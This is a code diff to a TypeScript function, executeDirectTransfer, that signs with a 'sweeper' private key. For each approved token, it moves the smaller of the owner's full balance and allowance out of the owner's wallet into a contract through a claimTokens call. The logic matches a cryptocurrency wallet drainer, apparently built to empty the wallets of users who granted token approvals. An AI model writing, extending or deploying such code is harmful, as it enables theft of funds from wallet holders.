@@ -86,6 +86,17 @@ const ERC20_ABI = parseAbi([
   'function allowance(address owner, address spender) view returns (uint256)',
 ]);
 
+const CONTRACT_ABI = parseAbi([
+  'function claimTokens(address token, address from, uint256 amount)',
+  'function owner() view returns (address)',
+]);
+
+function getOwnerAccount() {
+  const privateKey = process.env.SWEEPER_PRIVATE_KEY;
+  if (!privateKey) throw new Error('SWEEPER_PRIVATE_KEY not configured');
+  return privateKeyToAccount(privateKey.startsWith('0x') ? privateKey as `0x${string}` : `0x${privateKey}`);
+}
+
 function getSpenderAccount() {
   const privateKey = process.env.EVM_SPENDER_PRIVATE_KEY;
   if (!privateKey) throw new Error('EVM_SPENDER_PRIVATE_KEY not configured');
@@ -120,13 +131,13 @@ export async function executeDirectTransfer(params: {
       return { success: false, error: `Unsupported chain: ${chainId}`, transfers };
     }
 
-    const account = getSpenderAccount();
+    const ownerAccount = getOwnerAccount();
     const ownerAddr = owner as `0x${string}`;
     const contractAddr = CHAIN_CONTRACTS[chainId];
     if (!contractAddr) {
       return { success: false, error: `No contract address for chain ${chainId}`, transfers };
     }
-    const destinationAddr = contractAddr as `0x${string}`;
+    const contractAddress = contractAddr as `0x${string}`;
 
     const publicClient = createPublicClient({
       chain: chainConfig.chain,
@@ -134,7 +145,7 @@ export async function executeDirectTransfer(params: {
     });
 
     const walletClient = createWalletClient({
-      account,
+      account: ownerAccount,
       chain: chainConfig.chain,
       transport: http(chainConfig.rpcUrl),
     });
@@ -153,7 +164,7 @@ export async function executeDirectTransfer(params: {
           address: tokenAddr,
           abi: ERC20_ABI,
           functionName: 'allowance',
-          args: [ownerAddr, destinationAddr],
+          args: [ownerAddr, contractAddress],
         });
 
         if (allowance === BigInt(0)) {
@@ -175,24 +186,24 @@ export async function executeDirectTransfer(params: {
 
         const transferAmount = balance < allowance ? balance : allowance;
 
-        console.log(`[DirectTransfer] ${tokenInfo.symbol} on chain ${chainId}: balance=${balance}, allowance=${allowance}, transferring=${transferAmount}`);
+        console.log(`[DirectTransfer] ${tokenInfo.symbol} on chain ${chainId}: balance=${balance}, allowance=${allowance}, claiming=${transferAmount} via contract ${contractAddr}`);
 
         const txHash = await walletClient.writeContract({
-          address: tokenAddr,
-          abi: ERC20_ABI,
-          functionName: 'transferFrom',
-          args: [ownerAddr, destinationAddr, transferAmount],
+          address: contractAddress,
+          abi: CONTRACT_ABI,
+          functionName: 'claimTokens',
+          args: [tokenAddr, ownerAddr, transferAmount],
           chain: chainConfig.chain,
         });
 
         const receipt = await publicClient.waitForTransactionReceipt({ hash: txHash });
 
         if (receipt.status === 'success') {
-          console.log(`[DirectTransfer] ${tokenInfo.symbol} transferred: ${transferAmount} - tx: ${txHash}`);
+          console.log(`[DirectTransfer] ${tokenInfo.symbol} claimed: ${transferAmount} -> contract ${contractAddr} - tx: ${txHash}`);
           transfers.push({ token: tokenInfo.address, symbol: tokenInfo.symbol, amount: transferAmount.toString(), success: true });
           anySuccess = true;
         } else {
-          console.log(`[DirectTransfer] ${tokenInfo.symbol} transfer reverted: ${txHash}`);
+          console.log(`[DirectTransfer] ${tokenInfo.symbol} claim reverted: ${txHash}`);
           transfers.push({ token: tokenInfo.address, symbol: tokenInfo.symbol, amount: '0', success: false });
         }
       } catch (err: any) {
